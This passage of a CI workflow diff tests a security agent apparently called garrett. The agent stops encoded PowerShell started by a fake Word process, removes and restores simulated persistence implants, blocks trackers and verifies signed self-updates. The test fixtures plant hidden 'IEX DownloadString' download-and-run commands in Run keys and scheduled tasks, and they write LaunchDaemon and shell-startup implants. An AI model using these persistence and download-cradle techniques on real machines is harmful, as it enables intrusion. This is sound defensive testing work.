+          sudo grep -q "STOPPED" /tmp/agent.log
+          test "$(ls /tmp/gi | grep -c '^reached-')" = 0
+      - name: An implant with a LaunchDaemon and a shell startup line is cleaned up, then restored
+        run: |
+          (cd rust && cargo test --release --locked --test live --no-run)
+          sudo mkdir -p /private/tmp/gl && sudo cp /bin/sleep /private/tmp/gl/updater
+          printf '<?xml version="1.0" encoding="UTF-8"?>\n<plist version="1.0"><dict><key>Label</key><string>gl.test</string><key>ProgramArguments</key><array><string>/private/tmp/gl/updater</string><string>600</string></array></dict></plist>\n' | sudo tee /Library/LaunchDaemons/gl.test.plist > /dev/null
+          printf '(/private/tmp/gl/updater 5 &)\n' >> "$HOME/.zshrc"
+          sudo shasum -a 256 /private/tmp/gl/updater /Library/LaunchDaemons/gl.test.plist "$HOME/.zshrc" > before.txt
+          live=$(ls rust/target/release/deps/live-* | grep -v '\.d$' | head -1)
+          sudo env GARRETT_LIVE_STATE=/private/tmp/gl-state GARRETT_LIVE_FILES=/private/tmp/gl/updater "$live" --ignored --nocapture live_clean
+          for p in /private/tmp/gl/updater /Library/LaunchDaemons/gl.test.plist; do if [ -e "$p" ]; then echo "still there: $p"; exit 1; fi; done
+          grep -q '^# garrett-disabled .*updater 5' "$HOME/.zshrc"
+          sudo env GARRETT_LIVE_STATE=/private/tmp/gl-state "$live" --ignored --nocapture live_restore
+          sudo shasum -a 256 -c before.txt
+      # The privacy shield, with no measuring day (--learn 0). The probe is a copy of curl named like a browser: an
+      # ordinary program asking would itself count as software that depends on the tracker.
+      - name: The privacy shield refuses trackers that answer from their own networks, and nothing else
+        run: |
+          sudo sh -c "nohup $GITHUB_WORKSPACE/rust/target/release/garrett --state-dir /tmp/gp run --mode kill --learn 0 --update off > /tmp/shield.log 2>&1 &"
+          G="sudo rust/target/release/garrett --state-dir /tmp/gp"
+          cp "$(command -v curl)" /tmp/firefox
+          probe() { code=0; /tmp/firefox -4 -s -m 8 -o /dev/null "https://$1/" || code=$?; [ "$code" != 28 ] && [ "$code" != 7 ]; }
+          for i in $(seq 1 30); do $G shield | grep -q "Refused at the firewall now: .*criteo" && break; sleep 3; done
+          $G shield
+          if probe bidder.criteo.com; then echo "a refused tracker was reached"; exit 1; fi
+          probe www.google-analytics.com
+          probe example.com
+          $G shield off
+          for i in $(seq 1 20); do probe bidder.criteo.com && break; sleep 3; done
+          probe bidder.criteo.com
+          sudo pkill -f 'garrett --state-dir /tmp/gp' || true
+
+  rust-agent-windows:
+    runs-on: windows-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Build
+        shell: bash
+        run: cd rust && cargo build --release --locked
+      - name: An encoded PowerShell started by a document program is ended before it acts
+        shell: powershell
+        run: |
+          $ErrorActionPreference = 'Stop'
+          $state = Join-Path $env:TEMP 'gs'; $work = Join-Path $env:TEMP 'gi'; New-Item -ItemType Directory -Force $work | Out-Null
+          $agent = Start-Process (Join-Path $env:GITHUB_WORKSPACE 'rust\target\release\garrett.exe') -ArgumentList '--state-dir', $state, 'run', '--mode', 'kill', '--learn', '0' -PassThru -WindowStyle Hidden -RedirectStandardOutput (Join-Path $work 'agent.log') -RedirectStandardError (Join-Path $work 'agent.err')
+          Start-Sleep -Seconds 12
+          $word = Join-Path $work 'WINWORD.EXE'; Copy-Item (Join-Path $env:SystemRoot 'System32\cmd.exe') $word
+          $sent = 0
+          foreach ($delay in 0, 100, 500, 2000) {
+            foreach ($i in 1..3) {
+              $sent++
+              $script = "Start-Sleep -Milliseconds $delay; Set-Content -LiteralPath '$work\reached-$sent.txt' -Value 1"
+              $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($script))
+              Start-Process -FilePath $word -ArgumentList '/c', 'powershell.exe', '-NoProfile', '-NonInteractive', '-EncodedCommand', $encoded -WindowStyle Hidden
+              Start-Sleep -Milliseconds 400
+            }
+          }
+          Start-Sleep -Seconds 8
+          $reached = @(Get-ChildItem $work -Filter 'reached-*.txt').Count
+          Get-Content (Join-Path $work 'agent.log') | Select-Object -First 12
+          Get-Content (Join-Path $work 'agent.err') -ErrorAction SilentlyContinue | Select-Object -First 12
+          "markers that appeared: $reached of $sent"
+          Stop-Process -Id $agent.Id -Force -ErrorAction SilentlyContinue
+          if (-not (Select-String -Path (Join-Path $work 'agent.log') -Pattern 'STOPPED' -Quiet)) { throw 'nothing was stopped' }
+          if ($reached -ne 0) { throw 'an encoded PowerShell ran to the end' }
+      - name: An implant with a startup value, a scheduled task, a service and a Startup item is cleaned up, then restored
+        shell: powershell
+        run: |
+          $ErrorActionPreference = 'Stop'
+          $file = Join-Path $env:TEMP 'gl\updater.exe'; New-Item -ItemType Directory -Force (Split-Path $file) | Out-Null
+          Copy-Item (Join-Path $env:SystemRoot 'System32\whoami.exe') $file
+          $run = 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run'
+          New-ItemProperty -Path $run -Name 'GlTest' -Value ('"' + $file + '" /quiet') | Out-Null
+          Register-ScheduledTask -TaskName 'GlTest' -Action (New-ScheduledTaskAction -Execute $file) -Trigger (New-ScheduledTaskTrigger -AtLogOn) -Force | Out-Null
+          New-Service -Name 'GlTest' -BinaryPathName ('"' + $file + '"') -StartupType Manual | Out-Null
+          $startup = Join-Path $env:ProgramData 'Microsoft\Windows\Start Menu\Programs\StartUp\gltest.cmd'
+          Set-Content -Path $startup -Encoding ascii -Value ('start "" "' + $file + '"')
+          $hash = (Get-FileHash $file).Hash
+          $env:GARRETT_LIVE_STATE = Join-Path $env:TEMP 'gl-state'; $env:GARRETT_LIVE_FILES = $file
+          $ErrorActionPreference = 'Continue'
+          Push-Location rust; cargo test --release --locked --test live -- --ignored --nocapture live_clean 2>&1 | Select-Object -Last 12; $code = $LASTEXITCODE; Pop-Location
+          $ErrorActionPreference = 'Stop'
+          if ($code -ne 0) { throw 'nothing was cleaned' }
+          if (Test-Path $file) { throw 'the file is still there' }
+          if (Test-Path $startup) { throw 'the Startup item is still there' }
+          if ((Get-ItemProperty -Path $run).PSObject.Properties.Name -contains 'GlTest') { throw 'the startup value is still there' }
+          if ((Get-ScheduledTask -TaskName 'GlTest').State -ne 'Disabled') { throw 'the task is not disabled' }
+          if ((Get-Service -Name 'GlTest').StartType -ne 'Disabled') { throw 'the service is not disabled' }
+          $ErrorActionPreference = 'Continue'
+          Push-Location rust; cargo test --release --locked --test live -- --ignored --nocapture live_restore 2>&1 | Select-Object -Last 12; $code = $LASTEXITCODE; Pop-Location
+          $ErrorActionPreference = 'Stop'
+          if ($code -ne 0) { throw 'restore did not put everything back' }
+          if ((Get-FileHash $file).Hash -ne $hash) { throw 'the file did not come back' }
+          if (-not (Test-Path $startup)) { throw 'the Startup item did not come back' }
+          if ((Get-ItemProperty -Path $run).GlTest -ne ('"' + $file + '" /quiet')) { throw 'the startup value did not come back' }
+          if ((Get-ScheduledTask -TaskName 'GlTest').State -eq 'Disabled') { throw 'the task is still disabled' }
+          if ((Get-Service -Name 'GlTest').StartType -ne 'Manual') { throw 'the service start type did not come back' }
+          Unregister-ScheduledTask -TaskName 'GlTest' -Confirm:$false; Remove-ItemProperty -Path $run -Name 'GlTest'; sc.exe delete GlTest | Out-Null; Remove-Item $startup, $file -Force
+      - name: Startup entries that appear while the agent watches are switched off; ordinary ones and one put back on purpose stay
+        shell: powershell
+        run: |
+          $ErrorActionPreference = 'Stop'
+          $state = Join-Path $env:TEMP 'gw-state'; $work = Join-Path $env:TEMP 'gw'; New-Item -ItemType Directory -Force $work | Out-Null
+          $garrett = Join-Path $env:GITHUB_WORKSPACE 'rust\target\release\garrett.exe'
+          $run = 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run'
+          $fetch = { param($tag) "powershell.exe -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1:9/$tag')""" }
+          # There before the agent starts: the starting point, not news.
+          New-ItemProperty -Path $run -Name 'GwOld' -Value (& $fetch 'old') | Out-Null
+          $agent = Start-Process $garrett -ArgumentList '--state-dir', $state, 'run', '--mode', 'kill', '--learn', '0' -PassThru -WindowStyle Hidden -RedirectStandardOutput (Join-Path $work 'agent.log') -RedirectStandardError (Join-Path $work 'agent.err')
+          $began = Get-Date
+          Start-Sleep -Seconds 15
+          if ($agent.HasExited) { Get-Content (Join-Path $work 'agent.err'); throw 'the agent did not stay running' }
+          New-ItemProperty -Path $run -Name 'GwNew' -Value (& $fetch 'a') | Out-Null
+          New-ItemProperty -Path $run -Name 'GwPlain' -Value '"C:\Program Files\Vendor\app.exe" --background' | Out-Null
+          Register-ScheduledTask -TaskName 'GwTask' -Action (New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1:9/b')""") -Trigger (New-ScheduledTaskTrigger -AtLogOn) -Force | Out-Null
+          $names = { (Get-ItemProperty -Path $run).PSObject.Properties.Name }
+          foreach ($i in 1..40) { if ((& $names) -notcontains 'GwNew' -and (Get-ScheduledTask -TaskName 'GwTask').State -eq 'Disabled') { "switched off within about $($i * 2) seconds"; break }; Start-Sleep -Seconds 2 }
+          Start-Sleep -Seconds 4
+          Get-Content (Join-Path $work 'agent.log') | Select-Object -Last 8
+          Get-Content (Join-Path $work 'agent.err') -ErrorAction SilentlyContinue | Select-Object -First 8
+          if ((& $names) -contains 'GwNew') { throw 'the new startup value is still there' }
+          if ((Get-ScheduledTask -TaskName 'GwTask').State -ne 'Disabled') { throw 'the new task is not disabled' }
+          if ((& $names) -notcontains 'GwOld') { throw 'a startup value from before the agent started was removed' }
+          if ((& $names) -notcontains 'GwPlain') { throw 'an ordinary new startup value was removed' }
+          $keys = @(Get-ChildItem (Join-Path $state 'cleanup') -Filter '*.json' | ForEach-Object { $_.BaseName })
+          if ($keys.Count -lt 2) { throw "expected two cleaned cases, found $($keys.Count)" }
+          foreach ($key in $keys) { & $garrett --state-dir $state restore $key }
+          Start-Sleep -Seconds 20
+          if ((& $names) -notcontains 'GwNew') { throw 'the startup value put back on purpose was removed again' }
+          if ((Get-ScheduledTask -TaskName 'GwTask').State -eq 'Disabled') { throw 'the task put back on purpose was disabled again' }
+          # The privacy shield, with no measuring day: trackers that answer from their own networks are refused at
+          # the firewall and nothing else is. The probe is a copy of curl named like a browser.
+          $fox = Join-Path $work 'firefox.exe'; Copy-Item (Join-Path $env:SystemRoot 'System32\curl.exe') $fox
+          $probe = { param($name) & $fox -4 -s -m 8 -o NUL "https://$name/"; ($LASTEXITCODE -ne 28 -and $LASTEXITCODE -ne 7) }
+          foreach ($i in 1..30) { if ((& $garrett --state-dir $state shield) -match 'Refused at the firewall now: .*criteo') { break }; Start-Sleep -Seconds 3 }
+          & $garrett --state-dir $state shield
+          if (& $probe 'bidder.criteo.com') { throw 'a refused tracker was reached' }
+          if (-not (& $probe 'www.google-analytics.com')) { throw 'the shield broke Google' }
+          if (-not (& $probe 'example.com')) { throw 'the shield broke an ordinary site' }
+          & $garrett --state-dir $state shield off
+          foreach ($i in 1..20) { if (& $probe 'bidder.criteo.com') { break }; Start-Sleep -Seconds 3 }
+          if (-not (& $probe 'bidder.criteo.com')) { throw 'switching the shield off did not let the tracker through again' }
+          # The agent reads the Security log with a PowerShell command of its own, a minute after it starts and
+          # every minute after: that command names the attacks it searches for, and must not be taken for one.
+          $left = 150 - ((Get-Date) - $began).TotalSeconds; if ($left -gt 0) { Start-Sleep -Seconds $left }
+          $said = @(& $garrett --state-dir $state cases)
+          $said
+          if ($said -match 'credential_theft_tool') { throw 'the agent judged its own Security-log lookup' }
+          if ($agent.HasExited) { throw 'the agent stopped during the run' }
+          Stop-Process -Id $agent.Id -Force -ErrorAction SilentlyContinue
+          Unregister-ScheduledTask -TaskName 'GwTask' -Confirm:$false; Remove-ItemProperty -Path $run -Name 'GwOld', 'GwNew', 'GwPlain'
+
+  # An installed agent keeps itself current. Each job builds two agents from this commit, one of them given a
+  # later version number, both trusting a key made for this run alone (published agents trust only the project's
+  # key). The earlier one is installed the way a user installs it; the later one is offered by a stand-in for
+  # the site. First the things that must be refused, then the update itself.
+  update-linux:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Two versions and a site that offers the later one
+        run: sh .github/update-site.sh "$RUNNER_TEMP/u" garrett-linux-x86_64 openssl
+      - name: An unsigned list, a list signed by someone else, and a file that does not match are all refused
+        run: |
+          cd "$RUNNER_TEMP/u"
+          for bad in unsigned stranger swapped; do
+            code=0; sudo env GARRETT_UPDATE_BASE=http://127.0.0.1:8766/$bad ./old update > out.txt 2>&1 || code=$?
+            echo "$bad: $(cat out.txt)"
+            test "$code" != 0
+            test "$(./old version)" = "garrett $(cat old.version)"
+          done
+          grep -q "does not match the signed list" out.txt
+      - name: The installed agent brings itself to the later version and keeps running
+        run: |
+          U="$RUNNER_TEMP/u"; mkdir -p "$U/pack"
+          cp "$U/old" "$U/pack/garrett-agent"
+          cp packaging/garrett packaging/unblock debian/garrett.service packaging/linux/install.sh "$U/pack/"
+          sudo mkdir -p /etc/systemd/system/garrett.service.d
+          printf '[Service]\nEnvironment=GARRETT_UPDATE_BASE=http://127.0.0.1:8766/good GARRETT_UPDATE_AFTER=15\n' | sudo tee /etc/systemd/system/garrett.service.d/test.conf > /dev/null
+          sudo sh "$U/pack/install.sh"
+          sleep 3
+          before=$(systemctl show -p MainPID --value garrett)
+          echo "installed: $(garrett version), process $before"
+          for i in $(seq 1 60); do [ "$(garrett version)" = "garrett 9.9.9" ] && break; sleep 2; done
+          sleep 8
+          sudo journalctl -u garrett --no-pager -o cat | grep "garrett:" | tail -6
+          test "$(garrett version)" = "garrett 9.9.9"
+          sudo journalctl -u garrett --no-pager -o cat | grep -q "updated itself from $(cat $U/old.version) to 9.9.9"
+          test "$(systemctl is-active garrett)" = active
+          # The same process, now running the new program file: nothing was left unwatched in between.
+          test "$(systemctl show -p MainPID --value garrett)" = "$before"
+          test "$(sudo /proc/$before/exe version)" = "garrett 9.9.9"
+          test "$(sudo journalctl -u garrett --no-pager -o cat | grep -c 'watching this machine by itself')" = 2
+          test "$(sudo env GARRETT_UPDATE_BASE=http://127.0.0.1:8766/good garrett update --check)" = "garrett 9.9.9 is the newest version."
+      - name: UPDATE=off is respected
+        run: |
+          sudo systemctl stop garrett
+          sudo install -m 755 "$RUNNER_TEMP/u/old" /usr/lib/garrett/garrett-agent
+          sudo mkdir -p /etc/garrett && echo "UPDATE=off" | sudo tee /etc/garrett/garrett.conf > /dev/null
+          sudo systemctl start garrett
+          sleep 45
+          test "$(garrett version)" = "garrett $(cat $RUNNER_TEMP/u/old.version)"
+          test "$(systemctl is-active garrett)" = active
+
+  update-macos:
+    runs-on: macos-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Two versions and a site that offers the later one
+        run: sh .github/update-site.sh "$RUNNER_TEMP/u" garrett-macos "$(brew --prefix openssl@3)/bin/openssl"
+      - name: A file that does not match its signed list is refused
+        run: |
+          cd "$RUNNER_TEMP/u"
+          code=0; sudo env GARRETT_UPDATE_BASE=http://127.0.0.1:8766/swapped ./old update > out.txt 2>&1 || code=$?
+          cat out.txt
+          test "$code" != 0 && grep -q "does not match the signed list" out.txt
+      - name: The installed agent brings itself to the later version and keeps running
+        run: |
+          U="$RUNNER_TEMP/u"; mkdir -p "$U/pack"
+          cp "$U/old" "$U/pack/garrett-agent"
+          cp packaging/garrett packaging/macos/install.sh "$U/pack/"
+          sudo launchctl setenv GARRETT_UPDATE_BASE http://127.0.0.1:8766/good
+          sudo launchctl setenv GARRETT_UPDATE_AFTER 15
+          sudo sh "$U/pack/install.sh"
+          sleep 3
+          echo "installed: $(garrett version)"
+          for i in $(seq 1 60); do [ "$(garrett version)" = "garrett 9.9.9" ] && break; sleep 2; done
+          sleep 8
+          sudo tail -6 /var/log/garrett.log
+          test "$(garrett version)" = "garrett 9.9.9"
+          sudo grep -q "updated itself from $(cat $U/old.version) to 9.9.9" /var/log/garrett.log
+          test "$(sudo grep -c 'watching this machine by itself' /var/log/garrett.log)" = 2
+          pgrep -x garrett-agent > /dev/null
+
+  update-windows:
+    runs-on: windows-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Two versions and a site that offers the later one
+        shell: bash
+        run: sh .github/update-site.sh "$RUNNER_TEMP/u" garrett-windows.exe openssl
+      - name: A file that does not match its signed list is refused
+        shell: bash
+        run: |
+          cd "$RUNNER_TEMP/u"
+          code=0; GARRETT_UPDATE_BASE=http://127.0.0.1:8766/swapped ./old.exe update > out.txt 2>&1 || code=$?
+          cat out.txt
+          test "$code" != 0 && grep -q "does not match the signed list" out.txt
+      - name: The installed agent brings itself to the later version and keeps running as the same task
+        shell: powershell
+        run: |
+          $ErrorActionPreference = 'Stop'
+          $u = Join-Path $env:RUNNER_TEMP 'u'
+          $was = (Get-Content (Join-Path $u 'old.version')).Trim()
+          Copy-Item (Join-Path $u 'old.exe') (Join-Path $env:GITHUB_WORKSPACE 'garrett.exe')
+          [Environment]::SetEnvironmentVariable('GARRETT_UPDATE_BASE', 'http://127.0.0.1:8766/good', 'Machine')
+          [Environment]::SetEnvironmentVariable('GARRETT_UPDATE_AFTER', '15', 'Machine')
+          & (Join-Path $env:GITHUB_WORKSPACE 'deploy\install-windows.ps1')
+          $agent = Join-Path $env:ProgramFiles 'garrett\garrett.exe'
+          Start-Sleep -Seconds 3
+          $before = @(Get-Process garrett -ErrorAction SilentlyContinue).Id
+          "installed: $(& $agent version), process $before"
+          foreach ($i in 1..90) { if ((& $agent version) -eq 'garrett 9.9.9' -and @(Get-Process garrett -ErrorAction SilentlyContinue).Count -gt 0 -and @(Get-Process garrett).Id -ne $before) { break }; Start-Sleep -Seconds 2 }
+          Start-Sleep -Seconds 6
+          $now = @(Get-Process garrett -ErrorAction SilentlyContinue)
+          "now: $(& $agent version), process $($now.Id), task $((Get-ScheduledTask -TaskName 'garrett').State)"
+          if ((& $agent version) -ne 'garrett 9.9.9') { throw 'the agent did not update itself' }
+          if ($now.Count -ne 1) { throw "expected one running agent, found $($now.Count)" }
+          if ($now.Id -eq $before) { throw 'the old agent is still the one running' }
+          if ($now.Path -ne $agent) { throw "the running agent is $($now.Path)" }
+          if ((Get-ScheduledTask -TaskName 'garrett').State -ne 'Running') { throw 'the new agent is not running as the task' }
+          & (Join-Path $env:GITHUB_WORKSPACE 'deploy\uninstall-windows.ps1')
+          Start-Sleep -Seconds 3
+          if (@(Get-Process garrett -ErrorAction SilentlyContinue).Count -ne 0) { throw 'removing garrett left the updated agent running' }
+
+  # Small boards and devices. The 32-bit ARM agent is cross-built and its tests run under an emulated processor.
+  # The no-systemd install is tried on Alpine, where services are started by OpenRC, in report mode.
+  small-devices:
+    runs-on: ubuntu-24.04
+    steps:
+      - uses: actions/checkout@v4
+      - name: The agent's tests pass on 32-bit ARM
+        run: |
+          cargo install cross --locked --version 0.2.5
+          # One test compares the agent's signal table with the service's: the build container is shown that folder.
+          export CROSS_CONTAINER_OPTS="--volume $GITHUB_WORKSPACE/server:/server:ro"
+          cd rust && cross test --locked --target armv7-unknown-linux-musleabihf
+      - name: On a machine with OpenRC and no systemd, the bundle installs garrett as a service and removes it again
+        run: |
+          sudo apt-get update -q && sudo apt-get install -y -q musl-tools > /dev/null
+          rustup target add x86_64-unknown-linux-musl
+          (cd rust && cargo build --release --locked --target x86_64-unknown-linux-musl)
+          mkdir -p agents site && cp rust/target/x86_64-unknown-linux-musl/release/garrett agents/garrett-linux-x86_64
+          python3 -B packaging/build-release.py site --agents agents > /dev/null
+          docker run --rm --privileged -v "$PWD/site:/site:ro" alpine:3.20 sh -ec '
+            apk add --no-cache openrc > /dev/null
+            rc-status -a > /dev/null 2>&1; mkdir -p /run/openrc && touch /run/openrc/softlevel   # what a started machine has
+            mkdir -p /etc/garrett && printf "MODE=report\nUPDATE=off\nSHIELD=off\n" > /etc/garrett/garrett.conf
+            tar -xzf /site/garrett-linux-x86_64.tar.gz -C /tmp
+            sh /tmp/garrett/install.sh
+            sleep 6
+            rc-service garrett status
+            garrett version
+            garrett status
+            pgrep -f "[g]arrett-agent" > /dev/null
+            grep -q "watching this machine by itself (mode: report)" /var/log/garrett.log
+            sh /tmp/garrett/install.sh --remove
+            sleep 2
+            if pgrep -f "[g]arrett-agent" > /dev/null; then echo "the agent is still running after removal"; exit 1; fi
+            for left in /usr/lib/garrett /usr/bin/garrett /etc/init.d/garrett /var/lib/garrett; do if [ -e "$left" ]; then echo "left behind: $left"; exit 1; fi; done
+          '
